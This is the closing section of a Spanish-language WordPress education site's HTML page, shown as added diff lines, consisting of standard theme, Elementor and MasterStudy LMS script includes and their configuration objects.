+<script id="kadence-navigation-js-extra">
+var kadenceConfig = {"screenReader":{"expand":"Men\u00fa hijo","expandOf":"Men\u00fa hijo de","collapse":"Men\u00fa hijo","collapseOf":"Men\u00fa hijo de"},"breakPoints":{"desktop":"1024","tablet":768},"scrollOffset":"0"};
+</script>
+<script src="https://edu.wilanye.com/wp-content/themes/kadence/assets/js/navigation.min.js?ver=1.2.26" id="kadence-navigation-js" async></script>
+<script src="https://edu.wilanye.com/wp-content/plugins/elementor/assets/js/webpack.runtime.min.js?ver=3.30.0" id="elementor-webpack-runtime-js"></script>
+<script src="https://edu.wilanye.com/wp-content/plugins/elementor/assets/js/frontend-modules.min.js?ver=3.30.0" id="elementor-frontend-modules-js"></script>
+<script id="elementor-frontend-js-before">
+var elementorFrontendConfig = {"environmentMode":{"edit":false,"wpPreview":false,"isScriptDebug":false},"i18n":{"shareOnFacebook":"Compartir en Facebook","shareOnTwitter":"Compartir en Twitter","pinIt":"Pinear","download":"Descargar","downloadImage":"Descargar imagen","fullscreen":"Pantalla completa","zoom":"Zoom","share":"Compartir","playVideo":"Reproducir v\u00eddeo","previous":"Anterior","next":"Siguiente","close":"Cerrar","a11yCarouselPrevSlideMessage":"Diapositiva anterior","a11yCarouselNextSlideMessage":"Diapositiva siguiente","a11yCarouselFirstSlideMessage":"Esta es la primera diapositiva","a11yCarouselLastSlideMessage":"Esta es la \u00faltima diapositiva","a11yCarouselPaginationBulletMessage":"Ir a la diapositiva"},"is_rtl":false,"breakpoints":{"xs":0,"sm":480,"md":768,"lg":1025,"xl":1440,"xxl":1600},"responsive":{"breakpoints":{"mobile":{"label":"M\u00f3vil vertical","value":767,"default_value":767,"direction":"max","is_enabled":true},"mobile_extra":{"label":"M\u00f3vil horizontal","value":880,"default_value":880,"direction":"max","is_enabled":false},"tablet":{"label":"Tableta vertical","value":1024,"default_value":1024,"direction":"max","is_enabled":true},"tablet_extra":{"label":"Tableta horizontal","value":1200,"default_value":1200,"direction":"max","is_enabled":false},"laptop":{"label":"Port\u00e1til","value":1366,"default_value":1366,"direction":"max","is_enabled":false},"widescreen":{"label":"Pantalla grande","value":2400,"default_value":2400,"direction":"min","is_enabled":false}},"hasCustomBreakpoints":false},"version":"3.30.0","is_static":false,"experimentalFeatures":{"e_font_icon_svg":true,"additional_custom_breakpoints":true,"container":true,"nested-elements":true,"e_element_cache":true,"home_screen":true,"global_classes_should_enforce_capabilities":true,"cloud-library":true,"e_opt_in_v4_page":true},"urls":{"assets":"https:\/\/edu.wilanye.com\/wp-content\/plugins\/elementor\/assets\/","ajaxurl":"https:\/\/edu.wilanye.com\/wp-admin\/admin-ajax.php","uploadUrl":"https:\/\/edu.wilanye.com\/wp-content\/uploads"},"nonces":{"floatingButtonsClickTracking":"6a8ebde738"},"swiperClass":"swiper","settings":{"page":[],"editorPreferences":[]},"kit":{"active_breakpoints":["viewport_mobile","viewport_tablet"],"global_image_lightbox":"yes","lightbox_enable_counter":"yes","lightbox_enable_fullscreen":"yes","lightbox_enable_zoom":"yes","lightbox_enable_share":"yes","lightbox_title_src":"title","lightbox_description_src":"description"},"post":{"id":972,"title":"EDU%20WILANYE%20%E2%80%93%20Plataforma%20educativa","excerpt":"","featuredImage":false}};
+</script>
+<script src="https://edu.wilanye.com/wp-content/plugins/elementor/assets/js/frontend.min.js?ver=3.30.0" id="elementor-frontend-js"></script>
+<script src="https://edu.wilanye.com/wp-content/plugins/masterstudy-lms-learning-management-system/_core/assets/js/vc_modules/courses_grid/style_1.js?ver=9139" id="stm-courses_grid-js"></script>
+<script src="https://edu.wilanye.com/wp-content/plugins/masterstudy-lms-learning-management-system/_core/assets/js/vc_modules/image_container/card_image.js?ver=9139" id="stm-image_container-js"></script>
+<script src="https://edu.wilanye.com/wp-content/plugins/masterstudy-lms-learning-management-system/_core/assets/vendors/lazysizes.min.js?ver=3.6.10" id="lazysizes-js"></script>
+<script src="https://edu.wilanye.com/wp-content/plugins/masterstudy-lms-learning-management-system/_core/assets/js/lazyload.js?ver=3.6.10" id="masterstudy_lazysizes-js"></script>
+<script src="https://edu.wilanye.com/wp-content/plugins/masterstudy-lms-learning-management-system/_core/assets/js/wishlist.js?ver=3.6.10" id="stm-lms-wishlist-js"></script>
+<script src="https://edu.wilanye.com/wp-content/plugins/masterstudy-lms-learning-management-system/_core/assets/vendors/jquery.cookie.js?ver=3.6.10" id="jquery.cookie-js"></script>
+<script id="stm-lms-courses-js-extra">
+var courses_view = {"type":"list"};
+</script>
+<script src="https://edu.wilanye.com/wp-content/plugins/masterstudy-lms-learning-management-system/_core/assets/js/courses.js?ver=9139" id="stm-lms-courses-js"></script>
+<script src="https://edu.wilanye.com/wp-content/plugins/masterstudy-lms-learning-management-system/_core//assets/js/components/authorization/main.js?ver=3.6.10" id="masterstudy-authorization-main-js"></script>
+<script id="masterstudy-authorization-ajax-js-extra">
+var masterstudy_authorization_data = {"bad":"Bad","normal":"Normal","good":"Good","hard":"Hard"};
+var masterstudy_authorization_data = {"bad":"Bad","normal":"Normal","good":"Good","hard":"Hard"};
+</script>
+<script src="https://edu.wilanye.com/wp-content/plugins/masterstudy-lms-learning-management-system/_core//assets/js/components/authorization/ajax.js?ver=3.6.10" id="masterstudy-authorization-ajax-js"></script>
+</body>
+</html>
